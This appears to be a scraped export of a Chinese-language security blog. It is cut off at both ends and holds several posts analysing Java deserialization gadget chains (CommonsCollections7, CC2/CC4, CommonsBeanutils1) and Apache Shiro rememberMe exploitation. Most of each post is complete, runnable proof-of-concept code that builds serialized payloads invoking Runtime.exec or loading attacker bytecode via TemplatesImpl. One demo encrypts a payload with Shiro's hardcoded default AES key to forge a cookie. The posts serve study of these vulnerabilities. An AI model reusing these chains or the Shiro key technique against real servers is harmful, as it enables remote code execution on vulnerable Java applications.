Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34; }), new ConstantTransformer(1) };   然后去跟进利用链里，先看Hashtable的readobject，调用了reconstitutionPut\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold and loadFactor  s.defaultReadObject(); ... ... for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance  reconstitutionPut(table, key, value); } }   再跟进，可以看到这里的equals\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  private void reconstitutionPut(Entry\u0026lt;?,?\u0026gt;[] tab, K key, V value) throws StreamCorruptedException { if (value == null) { throw new java.io.StreamCorruptedException(); } // Makes sure the key is not already in the hashtable.  // This should not happen in deserialized version.  int hash = key.hashCode(); int index = (hash \u0026amp; 0x7FFFFFFF) % tab.length; for (Entry\u0026lt;?,?\u0026gt; e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026amp;\u0026amp; e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } // Creates the new entry.  @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Entry\u0026lt;K,V\u0026gt; e = (Entry\u0026lt;K,V\u0026gt;)tab[index]; tab[index] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); count++; }   要执行后面的equals，就得先绕过前面的(e.hash == hash)，这里用到的是hashCode的破解\nhashCode的算法不是什么md5什么的，是这样的一种简单实现\n1 2 3 4 5 6 7 8 9 10 11 12  public int hashCode() { int h = hash; if (h == 0 \u0026amp;\u0026amp; value.length \u0026gt; 0) { char val[] = value; for (int i = 0; i \u0026lt; value.length; i++) { h = 31 * h + val[i]; } hash = h; } return h; }    例如 A 的 ASCII 值为 65，a 为 97，B 为 66 ， hash(\u0026ldquo;Aa\u0026rdquo;)=65*31+97; hash(\u0026ldquo;BB\u0026rdquo;)=66*31+66=65*31+(66+31)=65*31+97=hash(\u0026ldquo;Aa\u0026rdquo;)\n 所以这里利用了这样的一个tricks，构造两个LazyMap，让两个LazyMap的hash恰好相等\n再把lazymap存入hashtable\n1 2 3 4 5 6 7 8 9 10 11  Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\u0026#34;yy\u0026#34;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); Reflections.setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers);   debug一下跟进一下情况，第一次put，会把键值对存入tab\n第二次put的时候，会发现这里key和之前的e.key不一样了，key多了个\u0026quot;yy\u0026quot;\n那么这会导致我们后面AbstractMapDecorator的equals执行不了\n所以我们得在后面序列化之前，把这个\u0026quot;yy\u0026quot;给remove掉，然后再调试就可以看到进去了AbstractMap的equals方法，进而执行到LazyMap的get方法\n然后就是transform的触发了\n再回头看看为什么我的Map为什么突然多了个\u0026quot;yy\u0026quot;\nHashtable调用put方法添加第二个元素（lazyMap2，1）的时候，该方法内部会调用equals方法根据元素的key判断是否为同一元素，那么调用了equals就会把\u0026quot;yy\u0026quot;给插进去了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  public synchronized V put(K key, V value) { //value是否为null  if (value == null) { throw new NullPointerException(); } //临时变量  Entry\u0026lt;?,?\u0026gt; tab[] = table; //计算元素的存储索引  int hash = key.hashCode(); int index = (hash \u0026amp; 0x7FFFFFFF) % tab.length; //获取指定索引的链表  @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Entry\u0026lt;K,V\u0026gt; entry = (Entry\u0026lt;K,V\u0026gt;)tab[index]; //遍历链表的节点（元素）  for(; entry != null ; entry = entry.next) { //判断key是否重复  if ((entry.hash == hash) \u0026amp;\u0026amp; entry.key.equals(key)) { //覆盖value  V old = entry.value; entry.value = value; return old; } } //key不重复则添加元素  addEntry(hash, key, value, index); return null; }   POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.AbstractMap; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class evil { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { Transformer transformerChain = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), new ConstantTransformer(1) }; Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain); lazyMap1.put(\u0026#34;yy\u0026#34;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain); lazyMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable table = new Hashtable(); table.put(lazyMap1,1); table.put(lazyMap2,2); setFieldValue(transformerChain,\u0026#34;iTransformers\u0026#34;,transformers); lazyMap2.remove(\u0026#34;yy\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(table); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } }   参考链接：\nlink1\nlink2\n","date":"2022-10-24T13:08:26+08:00","permalink":"https://example.com/post/cc7/","title":"[Java安全] CommonsCollections7链分析"},{"content":"前言 为什么CB1会和Shiro扯上关系，前面我们研究Shiro反序列化的时候，使用的是P牛的demo，我们可以看到maven项目里是装了一个CC3.2.1的，如果我把这个依赖删除的话\n重新加载maven，可以看到多了一个CB\n也就是说，Shiro是依赖于commons-beanutils的，但是我们却不能直接用我们上一篇文章提到的CB1链去打Shiro，看P牛的Java安全漫谈可以知道，有两个坑\n serialVersionUID必须一致，也就是说服务端的CB版本得和我们生成POC的CB版本一致   如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患\n  CB反序列化时需要依赖于CC   报错信息为：Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]\ncommons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections\n 无须依赖CC的利用链 因为之前的报错是：\n Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]\n 所以我们去定位到这里，BeanCompare，如果在实例化的时候没有给他传入comparator，那么就会调用这个ComparableComparator.getInstance()也就依赖了CC链\n不能用ComparableComparator的话就得找个平替来，需要满足的条件是\n 实现 java.util.Comparator接口 实现 java.io.Serializable接口 Java、shiro或commons-beanutils自带，且兼容性强  这里idea有个快捷键，在mac下是cmd+alt+b，可以用来寻找实现了这个接口的类\n可以找到一个CaseInsensitiveComparator满足条件，他是java.lang.String下的\n所以我们在创建BeanComparator对象的时候，就可以把这个String.CASE_INSENSITIVE_ORDER传进去，绕开对于CC的依赖\n最后的POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1pro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;1\u0026#34;); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   ","date":"2022-10-06T17:57:59+08:00","permalink":"https://example.com/post/shiro2/","title":"[Java安全] CommonsBeanutils1在Shiro中的利用"},{"content":"前言 Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法\nJavaBean就不多说了，搞过一点javaweb开发都知道的，commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，比如：\n1  PropertyUtils.getProperty(new Cat(), \u0026#34;name\u0026#34;);   CB链分析 CB链的触发是在org.apache.commons.beanutils.BeanComparator，是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了 java.util.Comparator 接口\n我们看一下他的源码，如果property不为null，那么就会执行PropertyUtils.getProperty调用JavaBean的getter方法去获取值来执行internalCompare，跟进internalCompare，会执行compare方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  public int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\u0026#34;IllegalAccessException: \u0026#34; + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\u0026#34;InvocationTargetException: \u0026#34; + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\u0026#34;NoSuchMethodException: \u0026#34; + var7.toString()); } } } private int internalCompare(Object val1, Object val2) { Comparator c = this.comparator; return c.compare(val1, val2); }   而前面说了PropertyUtils.getProperty会自动执行JavaBean的getter方法，而我们的TemplatesImpl的利用链里面，我们之前一直说的是触发TemplatesImpl#newTransformer()，但是其实newTransformer上面还有一层：TemplatesImpl#getOutputProperties()\n这是符合JavaBean的getter的定义的，那么我们就可以连接上CC2链子了\n利用链构造 首先是创建TemplatesImpl\n1 2 3 4 5 6 7  ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl());   然后创建BeanComparator和PriorityQueue，因为要把TemplatesImpl对象传入BeanComparator进行比较\n所以得把emplatesImpl对象传入传入PriorityQueue的queue\n把BeanComparator传入PriorityQueue的comparator\n然后就是CB的核心点，我们得把property传值为outputProperties，这样调用getProperty就会触发到TemplatesImpl#getOutputProperties()进入到利用链\n1 2 3 4 5 6 7  BeanComparator comparator = new BeanComparator(); PriorityQueue queue = new PriorityQueue(2, comparator); // stub data for replacement later queue.add(1); queue.add(1); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj});   到这里CB链就构造完成了，下面就可以序列化PriorityQueue对象了\n最后的POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(); PriorityQueue queue = new PriorityQueue(2, comparator); // stub data for replacement later  queue.add(1); queue.add(1); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   ","date":"2022-10-06T15:20:08+08:00","permalink":"https://example.com/post/cb1/","title":"[Java安全] CommonsBeanutils1利用链分析"},{"content":"前言 Apache Commons Collections有以下两 个分⽀版本：\n commons-collections:commons-collections org.apache.commons:commons-collections4  前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0\n那么他们有啥区别呢，因为我们是在研究CC反序列化链，所以我就从序列化链的角度来看\n区别就是LazyMap.decorate 这个⽅法没了，但其实CC4也是有的，叫做LazyMap.lazyMap，我们把原来CC3的POC换成这个也是可以成功反序列化的\nCC2 ysoserial对commons-collections4准备了两个链，一个是CC2一个是CC4\n在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从Serializable#readObject() ⽅法到 Transformer#transform() ⽅法的调⽤链\n我们看ysoserial的CC2的gadget，可以发现这里用到了一个PriorityQueue和TransformingComparator\n1 2 3 4 5 6 7 8 9 10  /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */   我们跟进具体分析一下利用链，首先我们看TransformingComparator，他有个compare方法，会调用transform\n1 2 3 4 5  public int compare(I obj1, I obj2) { O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); }   然后是PriorityQueue#readObject，他重写了readObject\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff  s.defaultReadObject(); // Read in (and discard) array length  s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements.  for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the  // spec has never explained what that might be.  heapify(); }   执行了一个heapify()，跟进去，调用了siftDown\n1 2 3 4  private void heapify() { for (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) - 1; i \u0026gt;= 0; i--) siftDown(i, (E) queue[i]); }   跟进siftDown，调用了siftDownUsingComparator，这里面调用了compare，这就和前面说的TransformingComparator连接上了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  private void siftDownUsingComparator(int k, E x) { int half = size \u0026gt;\u0026gt;\u0026gt; 1; while (k \u0026lt; half) { int child = (k \u0026lt;\u0026lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right \u0026lt; size \u0026amp;\u0026amp; comparator.compare((E) c, (E) queue[right]) \u0026gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) \u0026lt;= 0) break; queue[k] = c; k = child; } queue[k] = x; }   POC编写\n首先还是那套\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), new ConstantTransformer(1) }; // 传入fake防止序列化时执行  Transformer transformerChain = new ChainedTransformer(faketransformer);   然后再创建一个comparator，把transformerChain传进去\n1  Comparator comparator = new TransformingComparator(transformerChain);   实例化PriorityQueue，因为要执行compare，所以得传入2个单位，第二个参数写刚刚的comparator去执行到comparator.compare进而触发TransformingComparator的transform方法\n1 2 3  PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2);   往transformerChain替换进恶意的transformers\n1  setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers);   最后的POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; import static com.sun.xml.internal.xsom.impl.UName.comparator; public class CC2 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), new ConstantTransformer(1) }; // 传入fake防止序列化时执行  Transformer transformerChain = new ChainedTransformer(faketransformer); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   CC2与TemplatesImpl 前面说了Shiro这里不能有数组，所以这里我们再试试用TemplatesImpl来构造POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CC2pro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); // 无害transformer防止构造时触发  Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, null, null); Comparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2,comparator); queue.add(obj); queue.add(obj); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   有点区别的是这里，我们的queue.add(obj)，为什么不能add(1)了\n因为我们用了TemplatesImpl取代了ChainedTransformer，所以得找个办法传入参数，而这里的add就是一个传入参数的点，可以调试到，最后执行transform的时候，里面传的参数就是我们add进去的值\n所以我们传入TemplatesImpl对象，就会变成这样，成功进入TemplatesImpl的newTransformer\n","date":"2022-10-05T22:03:34+08:00","permalink":"https://example.com/post/cc4/","title":"[Java安全] CommonsCollections4链分析"},{"content":"测试环境搭建 我这里用的是P牛的JavaThings，这里有一个Maven构建的非常简易的Shiro的应用\n这里用idea打开，然后构建Maven项目，构建好以后简历一个Tomcat服务器就可以使用了\n直接访问localhost:8080\n我找了好久没找到相关的登录代码逻辑，后来发现，这个项目根本没写，只是在shiro.ini文件里写了就够了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [main] shiro.loginUrl = /login.jsp [users] # format: username = password, role1, role2, ..., roleN root = secret,admin guest = guest,guest [roles] # format: roleName = permission1, permission2, ..., permissionN admin = * [urls] # The /login.jsp is not restricted to authenticated users (otherwise no one could log in!), but # the \u0026#39;authc\u0026#39; filter must still be specified for it so it can process that url\u0026#39;s # login submissions. It is \u0026#39;smart\u0026#39; enough to allow those requests through as specified by the # shiro.loginUrl above. /login.jsp = authc /logout = logout /** = user   我们用root/secret登录，勾选上rememberme，登录进去就可以看到有rememberMe的cookie了\nShiro反序列化 简介 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。\n 得到rememberMe的cookie值 \u0026ndash;\u0026gt; Base64解码 \u0026ndash;\u0026gt; AES解密 \u0026ndash;\u0026gt; 反序列化\n 构建思路 那么这样的话，构造POC就非常简单了，只需要base64解码Shiro的key，然后对序列化数据进行AES加密即可得到exp\n比如这个demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.util.Base64; public class attack1 { public static void main(String[] args) throws Exception { byte[] payload = new CommonsCollections6().getPayload(\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payload, key); System.out.printf(ciphertext.toString()); } }   但是这个payload是打不通的，报错了\n具体原因是因为不能加载Transformer[]，细节原因不深入探究\n总的来说就是：如果shiro反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。\n那么我们如何构造才能避免使用Transformer数组呢，这就用到了前面学的TemplatesImpl\n上一篇文章我们介绍CC3的时候，用到了TemplatesImpl和InvokerTransformer，但是还是需要用到Transformer数组的\n这里有一篇博客介绍到了一个方法去绕过：wh1s3p1g\n这里就涉及到了我们CC6的一个关键类TiedMapEntry\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } // ...  public Object getValue() { return this.map.get(this.key); } // ...  public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // ...   我们在分析CC6利用链的时候，我们关注的是this.map.get(this.key);里面map触发get方法，对于里面的key我们只是随便传了个值并没去管他\n由于不能使用数组，所以ChainedTransformer就不能用了，那么这里我们自然也用不上ConstantTransformer了，那么我们就缺少了一个恶意对象和恶意对象参数的连接效果的东西了\n而这里恰好，TiedMapEntry的getValue方法会传入key，如果Map是LazyMap的话，我们会惊喜的发现，key会直接传入，执行transform函数，这个效果就和ConstantTransformer一样的，作为一个恶意对象传递的功能，所以我们只需要把恶意对象传入作为key就可以了\n构造POC 那么现在我们就来构造POC了，这里首先是参考前面的CC3利用TemplatesImpl去加载出一个恶意对象\n1 2 3 4  TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clazzBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl());   然后这里依然是用CC6的来接，构造faketransformer来防止构造时触发链子，但是和CC6的不一样，不能用ChainedTransformer了，所以得手动构造个无害transformer对象\n1  Transformer fakeTransformer = new ConstantTransformer(1);   然后就是加上CC6的链子了，具体看代码注释\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class attack2 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field 